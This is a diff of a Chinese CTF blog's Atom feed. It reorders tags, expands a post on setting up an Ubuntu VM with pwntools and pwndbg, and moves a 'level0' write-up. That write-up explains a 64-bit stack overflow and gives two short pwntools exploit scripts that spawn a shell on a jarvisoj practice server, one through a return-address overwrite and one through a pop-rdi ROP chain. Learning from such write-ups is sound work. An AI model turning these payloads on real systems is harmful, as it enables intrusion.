@@ -97,9 +97,9 @@
       <category term="堆" scheme="https://www.zzl14.xyz/categories/%E5%A0%86/"/>
     
     
-      <category term="linux" scheme="https://www.zzl14.xyz/tags/linux/"/>
-    
       <category term="malloc" scheme="https://www.zzl14.xyz/tags/malloc/"/>
+    
+      <category term="linux" scheme="https://www.zzl14.xyz/tags/linux/"/>
     
   </entry>
   
@@ -156,13 +156,13 @@
       <category term="堆" scheme="https://www.zzl14.xyz/categories/%E5%A0%86/"/>
     
     
-      <category term="堆" scheme="https://www.zzl14.xyz/tags/%E5%A0%86/"/>
-    
-      <category term="bin" scheme="https://www.zzl14.xyz/tags/bin/"/>
+      <category term="malloc" scheme="https://www.zzl14.xyz/tags/malloc/"/>
     
       <category term="linux" scheme="https://www.zzl14.xyz/tags/linux/"/>
     
-      <category term="malloc" scheme="https://www.zzl14.xyz/tags/malloc/"/>
+      <category term="堆" scheme="https://www.zzl14.xyz/tags/%E5%A0%86/"/>
+    
+      <category term="bin" scheme="https://www.zzl14.xyz/tags/bin/"/>
     
   </entry>
   
@@ -189,11 +189,11 @@
       <category term="堆" scheme="https://www.zzl14.xyz/categories/%E5%A0%86/"/>
     
     
-      <category term="linux" scheme="https://www.zzl14.xyz/tags/linux/"/>
+      <category term="chunk结构" scheme="https://www.zzl14.xyz/tags/chunk%E7%BB%93%E6%9E%84/"/>
     
       <category term="malloc" scheme="https://www.zzl14.xyz/tags/malloc/"/>
     
-      <category term="chunk结构" scheme="https://www.zzl14.xyz/tags/chunk%E7%BB%93%E6%9E%84/"/>
+      <category term="linux" scheme="https://www.zzl14.xyz/tags/linux/"/>
     
   </entry>
   
@@ -262,16 +262,15 @@
     <link href="https://www.zzl14.xyz/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/"/>
     <id>https://www.zzl14.xyz/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</id>
     <published>2019-11-15T08:10:08.000Z</published>
-    <updated>2019-11-15T08:20:00.397Z</updated>
+    <updated>2020-08-17T02:56:37.626Z</updated>
     
-    <content type="html"><![CDATA[<p>#今天讲的是pwndbg的一些基本操作</p><p><strong>1.首先下载Ubuntu</strong><br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p><p><strong>2.安装VMtools</strong></p><p><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安装时会出现很多提示 输入yes/no  都选 yes，</span><br><span class="line"></span><br><span class="line">如果提示 的是 路径， 则直接回车就好。</span><br></pre></td></tr></table></figure><p><strong>3.更换软件源</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a></p><p><strong>4.安装pip</strong></p><p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p><p>安装直接在终端输入：  sudo apt install python-pip</p><p><strong>5.更改pip源</strong><br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的</p><p>创建一个配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure><p>按照链接更改配置文件<br><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a></p><p><strong>6.安装pwntools</strong></p><p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p><p><strong>7.安装pwndbg</strong><br><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>]]></content>
+    <content type="html"><![CDATA[<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p><h2 id="1-安装镜像后，安装VMtools"><a href="#1-安装镜像后，安装VMtools" class="headerlink" title="1.安装镜像后，安装VMtools"></a>1.安装镜像后，安装VMtools</h2><p>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p><p>如果提示 的是 路径， 则直接回车就好。</p><p>直到安装完成，路径还在 vmware-tools-distrib 下</p><h2 id="2-更换软件源"><a href="#2-更换软件源" class="headerlink" title="2.更换软件源"></a>2.更换软件源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure><p>推荐：    <a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a><br>    <a href="https://blog.csdn.net/baidu_36602427/article/details/86551862" target="_blank" rel="noopener">https://blog.csdn.net/baidu_36602427/article/details/86551862</a>  //源比较多<br>    <a href="https://www.cnblogs.com/flyinggod/p/7979108.html" target="_blank" rel="noopener">https://www.cnblogs.com/flyinggod/p/7979108.html</a><br>不推荐：<a href="https://blog.csdn.net/xkwy100/article/details/80301156" target="_blank" rel="noopener">https://blog.csdn.net/xkwy100/article/details/80301156</a></p><p>解决问题E: Could not get lock /var/lib/apt/lists/lock<br><a href="https://www.cnblogs.com/qq952693358/p/6537846.html" target="_blank" rel="noopener">https://www.cnblogs.com/qq952693358/p/6537846.html</a></p><p>/etc/apt/sources.list</p><p>默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">预发布软件源，不建议启用</span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>sudo apt-get update</p><h2 id="3-安装pip"><a href="#3-安装pip" class="headerlink" title="3.安装pip"></a>3.安装pip</h2><p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p><pre><code>安装：  sudo apt install python-pip遇到问题，            Unable to locate package python-pip解决方法： 更新软件源        sudo apt-get update</code></pre><p><a href="https://www.jianshu.com/p/568aab038d4c" target="_blank" rel="noopener">https://www.jianshu.com/p/568aab038d4c</a><br><a href="https://blog.csdn.net/qq_35759574/article/details/82842637" target="_blank" rel="noopener">https://blog.csdn.net/qq_35759574/article/details/82842637</a></p><h2 id="4-更改pip源"><a href="#4-更改pip源" class="headerlink" title="4.更改pip源"></a>4.更改pip源</h2><p>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a><br><a href="https://www.jianshu.com/p/364146ade9be" target="_blank" rel="noopener">https://www.jianshu.com/p/364146ade9be</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h2 id="5-安装pwntools"><a href="#5-安装pwntools" class="headerlink" title="5.安装pwntools"></a>5.安装pwntools</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo apt-get install python-pip python-dev build-essential</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p><h2 id="6-安装pwndbg"><a href="#6-安装pwndbg" class="headerlink" title="6.安装pwndbg"></a>6.安装pwndbg</h2><p><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p><p>####pwn相关工具的安装全解<br><a href="https://blog.csdn.net/sea_time/article/details/103131548" target="_blank" rel="noopener">https://blog.csdn.net/sea_time/article/details/103131548</a></p><p>###解决git clone更新慢<br><a href="https://blog.csdn.net/hzwwpgmwy/article/details/79043251" target="_blank" rel="noopener">https://blog.csdn.net/hzwwpgmwy/article/details/79043251</a></p><h2 id="7-sublime下载"><a href="#7-sublime下载" class="headerlink" title="7.sublime下载"></a>7.sublime下载</h2><p><a href="https://blog.csdn.net/qq_34894670/article/details/83832881" target="_blank" rel="noopener">https://blog.csdn.net/qq_34894670/article/details/83832881</a></p><p><a href="https://blog.csdn.net/comway_Li/article/details/85050143" target="_blank" rel="noopener">https://blog.csdn.net/comway_Li/article/details/85050143</a></p><p><a href="https://blog.csdn.net/ajianyingxiaoqinghan/article/details/78910182" target="_blank" rel="noopener">https://blog.csdn.net/ajianyingxiaoqinghan/article/details/78910182</a></p><h2 id="8-docker搭建"><a href="#8-docker搭建" class="headerlink" title="8.docker搭建"></a>8.docker搭建</h2><p><a href="https://blog.csdn.net/White_Idiot/article/details/88950000" target="_blank" rel="noopener">https://blog.csdn.net/White_Idiot/article/details/88950000</a>      可以用<br><a href="https://www.cnblogs.com/blog-rui/p/9946382.html" target="_blank" rel="noopener">https://www.cnblogs.com/blog-rui/p/9946382.html</a></p><p> 好像不能用了，  <a href="https://nocbtm.github.io/2019/09/25/pwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">https://nocbtm.github.io/2019/09/25/pwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA/</a>           景学长博客<br><a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a></p><p>###出现lock问题<br><a href="https://blog.csdn.net/spurmoon/article/details/86618261" target="_blank" rel="noopener">https://blog.csdn.net/spurmoon/article/details/86618261</a></p><h2 id="9-时间同步"><a href="#9-时间同步" class="headerlink" title="9.时间同步"></a>9.时间同步</h2><p><a href="https://linux.cn/article-11220-1-rel.html" target="_blank" rel="noopener">https://linux.cn/article-11220-1-rel.html</a><br>cat /etc/timezone    //时区信息</p><p> sudo timedatectl set-timezone Asia/Shanghai    设为上海时区</p><p>date查看时间与时区</p><h2 id="10-sublime"><a href="#10-sublime" class="headerlink" title="10.sublime"></a>10.sublime</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/sublime-text-3</span><br><span class="line">sudo apt-get update   </span><br><span class="line">sudo apt-get install sublime-text</span><br></pre></td></tr></table></figure><h2 id="11-google拼音"><a href="#11-google拼音" class="headerlink" title="11.google拼音"></a>11.google拼音</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fcitx</span><br><span class="line">安装汉语语言包</span><br><span class="line">sudo apt install language-pack-zh-hans</span><br><span class="line"></span><br><span class="line">安装谷歌拼音输入法</span><br><span class="line">sudo apt install fcitx-googlepinyi</span><br><span class="line"></span><br><span class="line">打开 SystemSettings  -&gt; Language Support</span><br><span class="line"> 选择“keyboard input method system&quot;(键盘输入方式系统)为：fcitx</span><br></pre></td></tr></table></figure><p>在搜索栏点击搜索打开 fcitx configuration<br>Input Method<br>取消Only show current language<br>点击 “+” 增加 Google Pinyin<br>可通过 “^” 调整输入法默认顺序<br>Globlal Config? -&gt; Trigger Config 为切换输入法快捷键</p><h2 id="12-美化"><a href="#12-美化" class="headerlink" title="12.美化"></a>12.美化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:noobslab/themes</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install flatabulous-theme</span><br></pre></td></tr></table></figure><p>安装numix图标：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-add-repository ppa:numix/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install numix-icon-theme-circle</span><br></pre></td></tr></table></figure><p>安装Unity管理工具，这是一个神器，可以用来设置主题、图标等等：</p><p>sudo apt-get install unity-tweak-tool<br>把Ubuntu的启动器位置改为和Windows一样在桌面底部显示：</p><p>gsettings set com.canonical.Unity.Launcher launcher-position Bottom<br>如果要还原成默认的可以执行：</p><p>gsettings set com.canonical.Unity.Launcher launcher-position Left</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;#今天讲的是pwndbg的一些基本操作&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;1.首先下载Ubuntu&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://blog.csdn.net/kwame211/article/details/83902851&quot; target=&quot;_bl
+        &lt;p&gt;ubuntu下载&lt;br&gt;&lt;a href=&quot;https://blog.csdn.net/kwame211/article/details/83902851&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/kwame2
       
     
     </summary>
@@ -454,6 +453,34 @@
   </entry>
   
   <entry>
+    <title>level0</title>
+    <link href="https://www.zzl14.xyz/2019/08/08/level0/"/>
+    <id>https://www.zzl14.xyz/2019/08/08/level0/</id>
+    <published>2019-08-08T07:25:16.000Z</published>
+    <updated>2019-10-30T09:09:59.328Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>1.首先要用到</p><pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p><pre><code>Stack 的作用是防止栈的溢出NX    的作用为防止栈中的可执行代码  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p><pre><code>首先打开文件后可以按空格键，查看地址与汇编指令在功能表里找到main,便于分析程序按tab键会出现伪代码，我们分析这个来找出漏洞shift+F12可以出现字符串表ctrl+F 可以出现查找框想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p><pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址这里要了解一下栈的基本结构以及如何传递内容然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p><p>4.脚本的书写</p><pre><code>1.from pwn import *    (导入pwn里的内容)2.p=remote(&apos;地址&apos;,端口)    （连接服务器并创建一个对象）、3.p.recv()  p.recvline() p.recvuntil()    (都是接受服务器返回的字符串，具体区别不太懂)4.p.send()  p.sendline() p.sendafter()    (都是向服务器传入字符串，具体区别不太懂)5.p.interactive()    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p><pre><code>1.buf距离rbp 0x80，rbp本身占位82.函数返回地址可填callsystem的地址3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p><pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p><pre><code>3.所以构建的payload为    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p><p>一</p><p>`</p><pre><code>#coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)s_addr=0x0000000000400596p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))p.interactive()</code></pre><p><code>二</code></p><pre><code> #coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)rdi=0x400663p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))p.interactive()</code></pre><p>`</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+
+&lt;p&gt;1.首先要用到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;apos;file&amp;apos;  ，来查看用多少位的ida打开。
+&amp;apos;checksec&amp;apos; ，用来查看文件的保护机制&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt dat
+      
+    
+    </summary>
+    
+    
+    
+      <category term="做题题解" scheme="https://www.zzl14.xyz/tags/%E5%81%9A%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
+    
+  </entry>
+  
+  <entry>
     <title>python基本数据类型</title>
     <link href="https://www.zzl14.xyz/2019/08/08/python/"/>
     <id>https://www.zzl14.xyz/2019/08/08/python/</id>
@@ -505,34 +532,6 @@
 
 &lt;p&gt;攻防世界 &lt;/p&gt;
 &lt;h1 id=&quot;CGfsb&quot;&gt;&lt;a href=&quot;#CGfsb&quot; class=&quot;headerlink&quot; title=&quot;CGfsb&quot;&gt;&lt;/a&gt;CGfsb&lt;/h1&gt;&lt;p&gt;格式化字符串漏洞&lt;br&gt;因为当时做这个题时候不
-      
-    
-    </summary>
-    
-    
-    
-      <category term="做题题解" scheme="https://www.zzl14.xyz/tags/%E5%81%9A%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>level0</title>
-    <link href="https://www.zzl14.xyz/2019/08/08/level0/"/>
-    <id>https://www.zzl14.xyz/2019/08/08/level0/</id>
-    <published>2019-08-08T07:25:16.000Z</published>
-    <updated>2019-10-30T09:09:59.328Z</updated>
-    
-    <content type="html"><![CDATA[<a id="more"></a><p>1.首先要用到</p><pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p><pre><code>Stack 的作用是防止栈的溢出NX    的作用为防止栈中的可执行代码  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p><pre><code>首先打开文件后可以按空格键，查看地址与汇编指令在功能表里找到main,便于分析程序按tab键会出现伪代码，我们分析这个来找出漏洞shift+F12可以出现字符串表ctrl+F 可以出现查找框想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p><pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址这里要了解一下栈的基本结构以及如何传递内容然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p><p>4.脚本的书写</p><pre><code>1.from pwn import *    (导入pwn里的内容)2.p=remote(&apos;地址&apos;,端口)    （连接服务器并创建一个对象）、3.p.recv()  p.recvline() p.recvuntil()    (都是接受服务器返回的字符串，具体区别不太懂)4.p.send()  p.sendline() p.sendafter()    (都是向服务器传入字符串，具体区别不太懂)5.p.interactive()    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p><pre><code>1.buf距离rbp 0x80，rbp本身占位82.函数返回地址可填callsystem的地址3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p><pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p><pre><code>3.所以构建的payload为    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p><p>一</p><p>`</p><pre><code>#coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)s_addr=0x0000000000400596p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))p.interactive()</code></pre><p><code>二</code></p><pre><code> #coding:utf-8from pwn import *p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)rdi=0x400663p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))p.interactive()</code></pre><p>`</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-
-&lt;p&gt;1.首先要用到&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;apos;file&amp;apos;  ，来查看用多少位的ida打开。
-&amp;apos;checksec&amp;apos; ，用来查看文件的保护机制&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt dat
       
     
     </summary>
